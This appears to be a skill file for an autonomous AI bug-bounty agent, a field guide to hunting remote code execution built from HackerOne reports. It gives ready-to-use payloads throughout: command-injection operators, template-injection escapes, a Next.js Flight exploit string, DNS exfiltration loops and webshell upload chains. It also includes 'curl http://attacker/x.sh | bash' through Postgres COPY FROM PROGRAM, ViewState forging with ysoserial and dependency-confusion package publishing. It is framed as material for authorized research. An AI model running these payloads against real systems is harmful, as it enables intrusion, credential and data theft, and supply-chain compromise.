# Upstream source: rce (hunting)

Original path: `/tmp/h1res_MrPsycho04_Hunting-Agent/rce/SKILL.md`

---

---
name: rce
description: >-
  Hunting skill for rce vulnerabilities. Built from 67 public bug bounty reports. Use when hunting rce on
  any target. Combined with the HackerOne field guide (real disclosed-report data: where it pays, quick
  wins, payload banks). Hunt RCE, OS command injection, code injection, and unsafe eval. Use when testing
  file processing, integrations, templating, deserialization, or admin tooling. Backed by 1,399 disclosed
  HackerOne reports.
---

# RCE — Combined Field Guide

**Merged skill.** This fuses two complementary sources into one reference:

- **Part 1 — HackerOne field guide:** statistics from disclosed reports, "where it pays," quick wins, and curated payload banks.
- **Part 2 — Bug hunter methodology:** autonomous testing priority, canary discipline, crown-jewel targeting, OOB/validation gates, and reporting guidance.

**How to use:** Open with Part 2 for execution discipline (set your canary, know your success/failure gate). Use Part 1 to prioritize targets and pull payloads. Before reporting, run the validation gates in both parts.

---

<!-- ============ PART 1: HACKERONE FIELD GUIDE (data + payloads) ============ -->

# Remote Code / Command Injection — HackerOne field guide

Built from **1,399** publicly disclosed HackerOne reports (2013–2026). Corpus: `~/.local/share/hackerone-reports/`.

**Reference files (load on demand):**

- `references/payloads.md` — payload banks, probes, wordlists, Nuclei templates, observed parameters
- `references/techniques.md` — quick wins, bypasses, real-report techniques, deeper checklists

## Signal

- Reports: **1,399** · paid: **338**
- Median bounty **$800** · p90 **$8,000** · max **$33,510** · total **$888,597**
- Median upvotes **11**

## Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| GitLab | 38 | $179,420 | 5024 |
| shopify-scripts | 85 | $173,800 | 632 |
| Internet Bug Bounty | 129 | $98,057 | 2062 |
| Pornhub | 8 | $43,600 | 1008 |
| PayPal | 2 | $39,700 | 1797 |
| Uber | 18 | $32,000 | 816 |
| Mail.ru | 34 | $27,450 | 1686 |
| X / xAI | 20 | $26,180 | 2306 |

## Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`cmd` `exec` `command` `run` `eval` `template` `import` `convert` `render` `filename` `url`

## Tools

`interactsh` · `commix` · `ysoserial` · `nuclei` · `Burp`

## Escalation chains

- RCE -> cloud creds -> lateral movement.
- Upload + parser -> RCE.
- SSTI -> RCE.

## Related

- `deserialization` (93 reports)
- `ssti` (28 reports)
- `file-upload` (100 reports)

## Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

## Autonomous Testing Priority

**Content-type is the #1 silent failure mode for command injection.**

Traditional web forms use `Content-Type: application/x-www-form-urlencoded`. If you send a JSON body (`{"host":"127.0.0.1;id"}`) to a form endpoint, the server reads `request.form['host']` and gets nothing — the app executes normally with no injection, returning a plausible 200 response. You get a false negative with no indication anything went wrong.

**Rule:** If the page has an HTML form (`<form method="POST">`), use form-encoding. If the path is `/api/...` or the response is JSON, use JSON.

**Command injection operators to try (in order of prevalence):**
```
value;id        ← Unix semicolon (most common)
value|id        ← pipe
value&&id       ← AND
value$(id)      ← subshell
value`id`       ← backtick
```

**Proof:** OS command output (`uid=N(username) gid=...`) in the response body confirms code execution. The output may be HTML-wrapped — that still counts. If the response is otherwise normal (200, expected content) with the command output appended or embedded, exploitation is confirmed.

---

## Crown Jewel Targets

RCE vulnerabilities command the highest payouts in bug bounty programs because they grant attackers direct execution control over target infrastructure. The highest-value targets are:

**Highest-paying asset types:**
- **Enterprise server products** (GitHub Enterprise Server, self-hosted GitLab) — privilege escalation chains from low-privileged console roles to root SSH access consistently pay critical/high
- **Supply chain / package registries** — dependency confusion attacks against npm, PyPI, etc. hit critical severity across every major program
- **Cloud-native infrastructure** — exposed Kubernetes API servers, ingress controllers, and misconfiqured CI/CD pipelines
- **Mobile app backends and OAuth flows** — where server-side processing of attacker-controlled data meets execution contexts
- **Admin/management consoles** — template injection in configuration panels reaches root with a single payload

**Why this class pays most:**
- Blast radius is infrastructure-wide, not user-scoped
- Proof-of-concept is unambiguous — shell output is undeniable
- Fix requires architectural changes, not just a patch
- Programs cannot afford false negatives on RCE

---

## Attack Surface Signals

### URL Patterns
```
/management-console/*
/admin/settings/*
/api/v*/exec
/api/v*/run
/webhook/*
/_internal/*
/import?url=
/render?template=
/preview?format=
```

### Response Headers / Tech Stack Signals
```
X-Powered-By: Express          # Node.js — npm dependency surface
X-Powered-By: Phusion Passenger
Server: nginx (ingress-nginx)  # Kubernetes ingress — path field injection
X-Runtime: Ruby                # Rails ActiveStorage, RDoc, REXML attack surface
Content-Type: application/yaml # YAML parsers (SnakeYAML, Psych) — deserialization
X-GitHub-Enterprise-Version    # GHAS — nomad template, collectd, syslog-ng injection
```

### JavaScript / Frontend Signals
```javascript
// Look for these patterns in JS bundles
fetch('/api/exec', {method:'POST', body: cmd})
eval(userInput)
new Function(userInput)
document.write(unsafeData)
window.location = userControlled  // URL scheme bypass → JS execution
```

### Tech Stack Signals
| Signal | RCE Vector |
|--------|-----------|
| `nomad` in config UI | Template injection → `{{ ... }}` |
| `syslog-ng` config editable | Config injection → `program()` destination |
| `collectd` config editable | Plugin exec injection |
| `SnakeYAML` in classpath | `!!javax.script.ScriptEngineManager [...]` |
| npm `package.json` internal scope | Dependency confusion |
| ingress-nginx annotations | Path field regex bypass |

---

## Step-by-Step Hunting Methodology

1. **Map the execution contexts first.** Before testing payloads, identify everywhere user-controlled input touches an execution layer: template engines, shell commands, YAML parsers, file paths used in operations, package resolution, and configuration files.

2. **Enumerate admin/management interfaces.** Crawl for `/management-console`, `/admin`, `/_internal`, `/setup`, `/config`. These surfaces are lower-auth and higher-privilege — the GHES cluster produced 6 separate RCEs from one console role.

3. **Check template injection in every config field.** In any management UI that accepts free-form configuration (log destinations, notification formats, proxy settings), submit `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`. Look for `49` in responses, logs, or DNS callbacks.

4. **Test YAML/XML/serialized input for code execution.** Any endpoint accepting `Content-Type: application/yaml` or `application/xml`:
   - SnakeYAML: submit `!!javax.script.ScriptEngineManager` gadget
   - Ruby YAML: submit `!ruby/object:Gem::Installer` gadget
   - REXML: submit billion-laughs / quadratic blowup XML

5. **Hunt dependency confusion.** For every npm/pip/gem internal package name visible in JS bundles, error messages, or `package.json` in public repos — register a higher-versioned package on the public registry pointing to a canary callback.

6. **Check file path operations for traversal → execution.** ActiveStorage, file upload handlers, symlink operations: submit `../../../etc/cron.d/shell` as filename. Confirm write then trigger execution.

7. **Audit Kubernetes/cloud-native surfaces.** Run `kubectl` against any exposed API server. Check ingress annotations, especially `nginx.ingress.kubernetes.io/configuration-snippet` and `spec.rules.http.paths.path` for Lua/regex injection.

8. **Test OAuth redirect URI and URL scheme handlers.** Mobile apps processing `javascript:` or `intent://` URIs via OAuth redirect may execute JavaScript. Try `javascript:alert(document.cookie)` and custom scheme URIs.

9. **Verify with out-of-band callbacks.** Never rely solely on visible output. Use Burp Collaborator, interactsh, or `canarytokens.org` DNS tokens. Blind RCE is common in backend processors.

10. **Chain privileges.** A low-severity misconfiguration (editor role, CSRF, path traversal) combined with an RCE primitive equals critical. Always ask: "what can I reach from here?"

---

## Common Root Causes

**1. Configuration-as-code with insufficient sanitization**
Administrators edit configuration files (syslog-ng, collectd, nomad) through web UIs. Developers assume admin == trusted, so they pass field values directly into config files that support execution primitives (`program()` destinations, exec plugins, template functions).

**2. Template engines in privileged contexts**
Go's `text/template`, Freemarker, Velocity, and Twig are used for system configuration rendering. When user-controlled strings reach these engines without sandboxing, arbitrary code follows.

**3. Dependency confusion / namespace squatting**
Internal packages published to private registries without locking the public registry namespace. Build systems that prefer public registries by default, or that fall through to public when the private registry lacks a package.

**4. Unsafe deserialization of YAML/XML**
Developers use `YAML.load()` without safe loaders, or `new Yaml()` (SnakeYAML) without type restrictions. Ruby's `YAML.load` and Java's SnakeYAML both support arbitrary object instantiation by default.

**5. Path traversal in file operation chains**
Filenames accepted from user input are used in filesystem operations without normalization. Rails ActiveStorage, file upload handlers, and rdoc generators trust the `filename` parameter.

**6. Assuming low-privilege roles can't reach execution contexts**
The GHES management console granted "Editor" roles access to configuration fields that touched shell execution. Developers assumed privilege boundaries existed at a higher architectural level.

**7. Missing input validation on infrastructure-facing fields**
Ingress/nginx annotation values, Kubernetes spec fields, and webhook URLs are treated as opaque strings — but the downstream processor (nginx config generator, regex engine) interprets them as code.

---

## Gate 0 Validation

Before writing the report, confirm all three:

**1. What can the attacker DO right now?**
You must be able to demonstrate one of: execute `id`/`whoami` and capture the output, make a DNS/HTTP callback from the target server to your controlled host, write a file to the filesystem, or read `/etc/passwd`. "Might be able to" fails this gate.

**2. What does the victim LOSE?**
Articulate the concrete impact: source code exfiltration, credential theft (database, API keys, cloud IAM), lateral movement to internal network, supply chain compromise of downstream users, data destruction. Generic "attacker gains RCE" fails — name the crown jewels at risk.

**3. Can it be reproduced in 10 minutes from scratch?**
Write the reproduction steps before submitting. If you need more than: (a) a Burp request, (b) a payload file, and (c) a listener — simplify it. If reproduction requires a specific race condition, timing, or ephemeral state, document the exact conditions. Triagers who can't reproduce in one attempt will downgrade or close the report.

---

## Real Impact Examples

**Scenario A: Management Console Role → Root Shell (Enterprise Server)**
An attacker with a low-privileged "Management Console Editor" account on a GitHub Enterprise Server instance identified that the syslog-ng configuration UI accepted a free-form "destination" field. By injecting a `program()` destination containing a reverse shell command, the attacker caused the syslog-ng daemon (running as root) to execute arbitrary OS commands upon log receipt. The same attack surface was independently found in collectd's exec plugin configuration and nomad's job template rendering — all reachable from the same editor role. Impact: full root compromise of the enterprise git server hosting all organization source code, secrets, and CI/CD pipelines.

**Scenario B: Dependency Confusion → RCE on Build Infrastructure**
A researcher enumerated internal npm package names by reviewing JavaScript bundles served from target CDN endpoints and public GitHub repositories belonging to a major payments platform. Several `@internal/*` scoped packages were referenced but not registered on the public npm registry. The researcher published higher-versioned packages with identical names containing a postinstall script that executed a canary callback. Within hours, the callback fired from multiple IP addresses belonging to the target's CI/CD build farm — confirming that every npm install on their build infrastructure executed attacker-controlled code. The same technique worked against a ride-sharing platform's internal tooling. Impact: arbitrary code execution on build servers with access to production deployment credentials and signing keys.

**Scenario C: Exposed Kubernetes API → Cluster Takeover**
During reconnaissance on a target's cloud infrastructure, a researcher discovered a publicly accessible Kubernetes API server (port 6443) with overly permissive RBAC. Using default service account tokens and unauthenticated API calls, the researcher enumerated running pods, retrieved secrets from the default namespace (including database credentials and third-party API keys), and demonstrated the ability to spawn privileged pods with `hostPID: true` — enabling full node compromise. The Kubernetes cluster managed the target's core production services. Impact: access to all stored secrets, ability to deploy malicious workloads, and pivot to every service in the cluster.

---

## Chains & Compositions (Senior Hunting)

RCE in 2020-2026 rarely arrives at a single sink. Every modern RCE is composed of (1) a primitive that puts attacker bytes onto the host or into a deserialization pipeline, plus (2) an exec gadget that interprets them. The chains below decompose six high-paying RCE shapes into their primitive components — each step is testable in isolation, the chain is what pays.

### Chain 1 — SSRF + IMDSv1 + Leaked IAM Role → Lambda Invoke → Backend RCE (Capital One pattern)

- **A.** SSRF on a server-side fetcher (link-preview, image proxy, webhook URL, PDF generator). Confirmed via Burp Collaborator OOB callback.
- **B.** Point SSRF at AWS IMDSv1 metadata: `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` → returns temporary STS credentials.
- **C.** Use the credentials with `aws lambda invoke --function-name <internal-function>` — Lambda runs server-side code that the attacker can influence via the function's input parameter.
- **Impact:** Full backend RCE in the Lambda context, plus pivot path to whatever else the role grants (S3 / DynamoDB / RDS).
- **Real shape:** Capital One 2019 — $80M civil penalty, attacker conviction. SSRF in a WAF on EC2 → IMDSv1 → IAM role → 106M-record breach via S3 sync. Cross-refs `ssrf` Disclosed Report Citation #6.

### Chain 2 — SQLi + `COPY FROM PROGRAM` → Direct OS-level RCE on Postgres Host

- **A.** SQLi confirmed on a Postgres backend (boolean/time-based works; UNION not needed).
- **B.** The DB user has either `pg_read_server_files` or `COPY` privileges (default for many AWS RDS / Google Cloud SQL roles when "admin" databases exist).
- **C.** Stack a query: `'; COPY users FROM PROGRAM 'curl http://attacker/x.sh | bash'; --` → Postgres shells out to `/bin/sh -c <attacker command>` → RCE as `postgres` user.
- **Impact:** RCE as the database user, which on managed Postgres frequently has IAM credentials and direct access to other AWS resources.
- **Real shape:** Multiple H1 disclosures 2020-2024 across SaaS apps backed by Postgres. Cross-refs `sqli` Disclosed Report Citation #12 and root cause discussion of `FILE`/`xp_cmdshell` privileges.

### Chain 3 — Image Upload + Path Traversal in Filename + Misconfigured MIME Serving → Webshell

- **A.** File upload accepts images (`image/png`, `image/jpeg`). The server saves with the user-supplied filename or only validates Content-Type, not actual content.
- **B.** Upload a `.aspx`/`.jsp`/`.php` file with the correct image magic-bytes (`GIF89a` + PHP after) and a filename containing `../` to write outside the upload directory into the web-root (`../../../public/webshell.php`).
- **C.** Request `https://target/webshell.php?cmd=id` — server's PHP/ASP.NET handler runs the script regardless of extension policy because the path doesn't pass through the upload-dir filter.
- **Impact:** Unauthenticated or low-priv attacker gets webshell on the application server with the web-server's process privileges.
- **Real shape:** Multiple disclosed H1 cases on legacy upload handlers; canonical pre-2020 RCE class. Pairs with `file-upload` (upload bypass table) and `misc` path-traversal patterns.

### Chain 4 — Prototype Pollution + Lodash/Mongoose Gadget Chain → `child_process.spawn` → Node RCE

- **A.** Identify prototype pollution sink — JSON merge / Object.assign / lodash `_.merge` / Node `Object.create` chain receiving attacker JSON.
- **B.** Pollute `Object.prototype.shell` to `true` OR `Object.prototype.env.NODE_OPTIONS` to `--require ./malicious.js`. The polluted prototype reaches a downstream `child_process.spawn` or `vm.runInThisContext`.
- **C.** Sink executes with attacker-controlled shell/env → attacker code runs in Node.js process context with full access to environment variables, AWS metadata, internal services.
- **Impact:** Server-side JS execution from a JSON POST. Common in Express apps using `body-parser` + `lodash.merge` for config-merging.
- **Real shape:** `lodash.merge` CVE-2018-16487, CVE-2019-10744, CVE-2020-8203; `mongoose` CVE-2024-53900 (cross-refs `sqli` Disclosed Report Citation #10 — same gadget family reaches Mongo `$where` instead of process).

### Chain 5 — Unencrypted ViewState + Recovered MachineKey → ASP.NET Deserialization → RCE (ToolShell class)

- **A.** Identify an ASP.NET endpoint where `__VIEWSTATEENCRYPTED=""` (ViewState is signed but not encrypted). Confirm via Burp / curl on form-bearing pages.
- **B.** Recover the `<machineKey>` validationKey — via config leak (`/web.config` accessible), via subdomain takeover of a sibling app sharing the key, or via the CVE-2025-53771 ToolShell exploit chain that exfils the key on Subscription Edition.
- **C.** Forge a ViewState using `ysoserial.net --plugin=ViewState --validationkey=<key>` with a `TypeConfuseDelegate` / `WindowsIdentity` payload. Submit to the endpoint. ASP.NET deserialises into a method-call gadget chain ending in `Process.Start` → RCE as the worker-process identity.
- **Impact:** Full RCE on the IIS web front-end with whatever the AppPool identity grants — often `NETWORK SERVICE` (with SharePoint farm-account access) or higher.
- **Real shape:** CVE-2025-53770 / 53771 ToolShell (July 2025 emergency advisory); SP2013 unpatched-by-EoL exposure. Cross-refs `sharepoint` ToolShell precondition chain and `aspnet` ViewState dual-parser anti-pattern.

### Chain 6 — XXE + PHP `expect://` Stream Wrapper → Direct RCE on Legacy PHP

- **A.** XXE confirmed via OOB DTD callback (`<!ENTITY % x SYSTEM "http://attacker/dtd">`).
- **B.** Target runs PHP with the `expect` extension enabled (rare in 2026, but still present on legacy hosts and some shared-hosting providers).
- **C.** Send `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>` — PHP's stream wrapper executes `id` through expect → output returned in entity expansion or via OOB.
- **Impact:** RCE as the PHP/web-server user without needing a separate upload or SQLi primitive.
- **Real shape:** Rockstar Games emblem editor XXE H1 #347139 (2018, $1,500); Adobe Commerce CosmicSting CVE-2024-34102 (XXE → RCE via crypt-key exfil). Cross-refs `xxe` Disclosed Report Citation #7 and #10.

### Operator-level pattern

Every modern RCE chain has two halves: **the bytes get there** (SSRF, SQLi, upload, prototype-pollution, ViewState, XXE) and **the bytes get interpreted** (lambda invoke, COPY PROGRAM, webshell handler, child_process.spawn, deserializer gadget, expect://). Hunt for the first half; the second is usually one of the six above. If your first-half primitive doesn't compose with any of these — pause before submitting. "Could lead to RCE" is Low/Medium; "RCE demonstrated end-to-end" is Critical.

Cross-references:
- `ssrf` — Chain 1
- `sqli` — Chain 2
- `file-upload` — Chain 3
- `api-misconfig` (proto-pollution) — Chain 4
- `sharepoint` + `aspnet` — Chain 5
- `xxe` — Chain 6

---

## Related Skills & Chains

- **`ssti`** — Template engines that hit `eval()`/`exec()`/`os.system()` are RCE hiding behind a render call. Chain primitive: Jinja2 `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` reflected in email-template preview → unauthenticated RCE as the worker process.
- **`file-upload`** — File-write primitives become RCE when the upload directory is web-served, processed by a deserializer, or loaded by a `.htaccess`/`web.config`. Chain primitive: SVG/PHP polyglot bypasses MIME check → direct `GET /uploads/shell.php?cmd=id` → RCE; or DOCX with `phar://` stream wrapper → PHP object deserialization → RCE.
- **`ssrf`** — When the RCE primitive lives on an internal-only endpoint (admin console, internal Redis, Jenkins script-console), gate it through an SSRF. Chain primitive: external SSRF → `http://127.0.0.1:8080/manage/scriptText` (Jenkins/Tomcat) → Groovy `Runtime.exec` → RCE; or SSRF → `gopher://redis:6379` write to crontab → RCE.
- **`aspnet`** — ASP.NET ViewState deserialization is a giant RCE class behind a known `__VIEWSTATE` parameter. Chain primitive: machineKey recovery (or leaked `<machineKey>` from `web.config` disclosure) → `ysoserial.net -p ViewState -g TypeConfuseDelegate` → RCE as `IIS APPPOOL\<name>`.
- **`security-arsenal`** — Reach for the deserialization payload tree (ysoserial Java gadget chains, ysoserial.net for .NET ViewState/BinaryFormatter, Python pickle `__reduce__`, Ruby Marshal, PHP `phar://` metadata, Node `node-serialize` IIFE) the moment you have a sink that accepts serialized bytes.
- **`triage-validation`** — Apply the Pre-Severity Gate before claiming Critical. A "blind RCE" that turns out to be file-write-only with no execution path is not RCE; a sandboxed eval that can't reach `os` is at best Medium SSTI. Prove `whoami`/OOB DNS callback with a unique marker before writing the report.

## Web-Research Methodology Additions (2026)

### A. Discovery checklist — concrete artifacts, endpoints, patterns, tools to look for

- **OWASP A05:2025 Injection** is the home category (CWE-77/78 command, CWE-88 argument, CWE-1336 SSTI). Injection is 100% covered by tested apps and has the most CVEs of any category — treat every interpreter-facing input as a candidate.
- **Classic command-injection sinks:** network diagnostics (`ping`, `host`, `nslookup`, `traceroute`), converters (`convert`, `zip`, `ffmpeg`, `exiftool`), mail (`mail -s`), PDF generators, backup/maintenance forms, search, and CGI/admin wrappers. Trace *filenames* and header values (`X-Forwarded-For`) into the command string, not just visible form fields.
- **Top 25 RCE-flavoured parameters (trbughunters):** `cmd`, `exec`, `command`, `execute`, `ping`, `query`, `jump`, `code`, `reg`, `do`, `func`, `arg`, `option`, `load`, `process`, `step`, `read`, `function`, `req`, `feature`, `exe`, `module`, `payload`, `run`, `print`.
- **Dangerous APIs by language (OWASP WSTG INPV-12):** Java `Runtime.exec()`; C/C++ `system/exec/ShellExecute`; Python `exec/eval/os.system/os.popen/subprocess.Popen`; PHP `system/shell_exec/exec/proc_open/eval/passthru`; Node `child_process.exec/execSync/spawn`; Ruby `system/exec/Open3.popen3`; Go `exec.Command`; C# `Process.Start`.
- **Argument/option injection (no shell needed):** any value beginning `-`/`--` passed via `execve`/`execFile` to `curl` (`-o /path`, `-K <url>`), `ping` (`-f`, `-c 100000`), `tcpdump` (`-G 1 -W 1 -z /path/script.sh`), ExifTool (`-if` with Perl expressions, newline-delimited argument smuggling via JSON keys). Watch `--` end-of-options mitigations placed in the wrong position.
- **Second-order / asynchronous sinks:** stored email addresses or filenames later consumed by a GPG key test or converter; log-poisoning where a privileged job later `grep|sed|awk`s a log into a backtick `find` command; JVM argument injection (`_JAVA_OPTIONS`, `AdditionalJavaArguments`) turned into `-XX:MaxMetaspaceSize=16m -XX:OnOutOfMemoryError="<cmd>"`.
- **SSTI detection:** `{{7*7}}`→49, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`; engines Jinja2, Twig/Blade, FreeMarker/Velocity, ERB, Mako, Groovy, Razor. Code-context injection discovered by closing the statement (`}}SSTI`).
- **Deserialization sinks:** Java `ObjectInputStream.readObject`, PHP `unserialize()`, Python `pickle.load`, .NET `BinaryFormatter.Deserialize`, Ruby `Marshal.load`, Node `node-serialize`; native formats (JSON is safe by design).
- **Tooling:** `commix`, `Bashfuscator`, `Invoke-DOSfuscation`, PortSwigger `SHELLING`/Command Injection Attacker (payload generator with time/DNS/filesystem feedback channels and payload marking), `ysoserial`/`ysoserial.net`/`phpggc`, `frida` for mobile-to-`Runtime.exec` pivots, Semgrep taint rules for white-box confirmation, `react2shell-scanner` for Next.js Flight RCE.

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- **Direct/in-band proof:** append `;id`, `|id`, `&&id`, `||id`, or `%0A id` (newline, recommended by HackTricks) and look for `uid=` in the response. Break out of a quoted context first with `"`/`'`. Unix-only: backticks `` `id` ``, `$(id)`, `${IFS}` to synthesize spaces, `ls${LS_COLORS:10:1}${IFS}id`.
- **Blind time delay:** `& ping -c 10 127.0.0.1 &` (10s), `; sleep 10;`, `|| ping -c 10 127.0.0.1 ||`. Character-by-character exfiltration: `time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi` — a 5s delay confirms the character.
- **Output redirection:** `& whoami > /var/www/static/whoami.txt &` then fetch `/whoami.txt`; PortSwigger's lab uses `email=||whoami>/var/www/images/output.txt||` and retrieves via the image `filename` parameter.
- **OOB / OAST (most reliable for blind and *asynchronous* injection):** `email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||` — the username appears in the DNS subdomain. `;curl http://<collab>/cmdi-test` or `%3Bcurl+http://LHOST:LPORT/$(whoami)` confirms both execution and effective user. Poll Collaborator repeatedly — async commands fire after the HTTP response. DNS exfil: `for i in $(ls /); do host "$i.<dnsbin-subdomain>"` or `$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').collab)`.
- **Windows payloads:** `& whoami &`, `| ver |`, `powershell C:\**2\n??e*d.*?` (wildcard `calc`), `@^p^o^w^e^r^shell c:\**32\c*?c.e?e`, and `%0A` newline; Linux `sleep`/`curl` do not apply.
- **Filter/allowlist bypasses:** numeric-prefix validation is not a shell guard — `saml_id=1%26http://$(whoami)` retains the integer then uses URL-encoded `&` + substitution. Bash arithmetic contexts re-tokenize: `st=theValue&h=gPath['sleep 5']` reaches `[[ ... -gt ${gStartTime} ]]` and executes (Ivanti EPMM pattern). Stored email local part: ``a`touch${IFS}/tmp/proof`@attacker.example`` bypasses space filtering (Savane pattern).
- **Node.js distinction:** `exec()` spawns `/bin/sh -c` (injectable); `execFile()`/`spawn()` with an argument array is safe from *shell* injection but still vulnerable to leading-hyphen option injection. Synology Photos Pwn2Own 2024 placed attacker data into an `exec()` template string via an unauthenticated WebSocket event.
- **SSTI to RCE (quote-free, plugin-free):** Jinja2 `{{self.__init__.__globals__.__str__()[1786:1788]}}` to build strings by index; Mako `${str().join(chr(i) for i in [105,100])}`; Twig/PHP `{{passthru(implode(null,array_map(chr(99).chr(104).chr(114),[105,100])))}}` → `id` (BeyondTrust CVE-2025-5309). Sandbox escapes are a severe class (USENIX 2023 TEFuzz research).
- **React2Shell / Next.js Flight (CVE-2025-55182):** `{"then":"$1:__proto__:then","_response":{"_prefix":"require('child_process').exec('id')","_formData":{"get":"$1:constructor:constructor"}}}`; remote oracle `500` + `E{"digest"` on malformed Flight payloads (`react2shell-scanner --safe-check`).
- **Deserialization:** reach ysoserial gadget chains once a native-format sink is confirmed; .NET ViewState via recovered `machineKey`; PHP `phar://` metadata; use `ObjectInputFilter` allowlists as the defensive reference point.

### C. Validation / proof bar — how to confirm and avoid false positives

- **Three detection tiers, most reliable first:** OOB callback > time delay > in-band output. Time-based misses asynchronous execution; in-band output misses blind sinks. Use `SHELLING` payload marking to trace which payload produced a result.
- **Prove execution, not just parsing:** a reflected `uid=` string, an `id`-labelled DNS callback, or `whoami` file contents with a unique marker. A 500 error or a generic "command failed" is not RCE.
- **Parent process behaviour matters:** a WAF/logging pipeline that only inspects response bodies misses blind injection entirely — confirm with an out-of-band interaction, not a status code.
- **Distinguish command injection from argument injection** (leading hyphen) and from code injection (`eval`/template) — mitigation and reporting differ; `execFile` removing the shell does not remove option-injection risk.
- **Second-order chains require full path tracing:** from unauthenticated log writer → scheduled reader → later shell sink; an immediate HTTP response is not proof. The same applies to stored email/filename values consumed by later admin actions.
- **Deserialization gate:** a serialized blob that is parsed-and-reserialized (removing the carrier) is not exploitable — confirm the original text survives to a shell/render sink.
- **Pre-Severity Gate:** a file-write-only primitive with no execution path is not RCE; a sandboxed eval that cannot reach `os` is at most Medium SSTI. Pinning down the effective user (`whoami`) and OS (`uname -a`/`ver`) is part of the proof and the impact statement.
- **Source-code review is the best method** for finding injection (OWASP); SAST flags `system()/exec()/popen()/shell_exec()` with tainted input but cannot find runtime-only flows — pair with DAST/OAST.

- **Escalation ladder after confirmation:** `whoami` → `uname -a`/`ver` → `ifconfig`/`ipconfig /all` → `netstat -an` → `ps -ef`/`tasklist` (PortSwigger's initial command set), then decide between local privilege escalation and lateral movement — all with a unique marker to keep the PoC attributable.
- **Attachment-injection variants worth a dedicated pass:** uploaded filename reaching an `odt2spip`/converter command (SPIP), PEM explanatory text (`$(...)` preamble before a `BEGIN` line, RFC 7468) surviving into a shell-backed `openssl` call (Cisco SSM "Dirty Cert"), and relative-path executable selection (`../Windows/System32/cmd` in PaperCut Scan-to-Fax).
- **Rule engines and scripting as RCE:** admin "rule" editors that evaluate PHP can become full RCE if `runkit` is enabled (`runkit_function_redefine('checkBid', ..., 'system($_GET["cmd"])')`); printer/scripting consoles (PaperCut) and Jenkins script console are the same class behind a different UI.
- **WAF evasion is not proof:** OWASP ModSecurity CRS flags shell metacharacters and `whoami`/`cat /etc/passwd`/`nslookup`, but encoding/case variation bypasses rules — treat a bypass as a signal, then prove execution with OOB.
- **SOC-side indicators to align the report with:** web-server processes spawning `bash`/`sh`/`cmd.exe`/`powershell`, unexpected `execve()`/`system()` calls from the app process, and outbound connections from application processes — these strengthen the impact statement for enterprise clients.
- **Source-review triage for white-box engagements:** flag string concatenation into `system()`/`exec()`/`proc_open()`/`Runtime.exec()`/`child_process.exec()`; prefer `execFile`/`spawn` with argument arrays and `escapeshellarg`-style quoting as the recommended fix (OWASP OS Command Injection Defense cheat sheet).
- **Deserialization → RCE chain discipline:** match the language to the gadget set (ysoserial Java, ysoserial.net .NET, phpggc PHP, pickle `__reduce__` Python, `phar://` metadata); a blob that is only parsed-and-reserialized is not exploitable.
- **SSTI sandbox caveat:** a working `{{7*7}}` does not guarantee RCE — modern engines sandbox template escape; demonstrate the escape (class walker / callback registrar) or downgrade to SSTI rather than claiming Critical.
- **Rate-limit/blind-timing caveat:** time-based probes can be drowned by asynchronous execution or variable backend load — require a statistically clear delay delta (or move to OOB) and repeat before concluding.

### D. Sources — numbered list of URLs you actually fetched

1. https://portswigger.net/web-security/os-command-injection (separators, time delays, output redirection, useful post-exploitation commands)
2. https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/command-injection/asynchronous (asynchronous injection + Collaborator OAST procedure)
3. https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration (`nslookup \`whoami\`.collab` exfiltration payload)
4. https://hacktricks.wiki/en/pentesting-web/command-injection.html (payload matrix, option injection, second-order/PEM/ExifTool cases, top-25 params)
5. https://github.com/PortSwigger/command-injection-attacker (SHELLING methodology and feedback channels)
6. https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection (dangerous APIs by language, bypasses)
7. https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html (escapeshellarg, parameterization, `--` end-of-options caveat)
8. https://top10.owasp.org/2025/A05_2025-Injection (A05:2025 Injection scope and CWE mapping)
9. https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html (native deserialization → RCE, .NET gadget list, safe alternatives)
10. https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/nextjs.html (React2Shell Flight payload, RSC scanner oracle, version coverage)
11. https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation (quote-free Jinja2/Mako/Twig RCE payloads)
12. https://www.usenix.org/system/files/usenixsecurity23-zhao-yudi.pdf (template sandbox escape research)

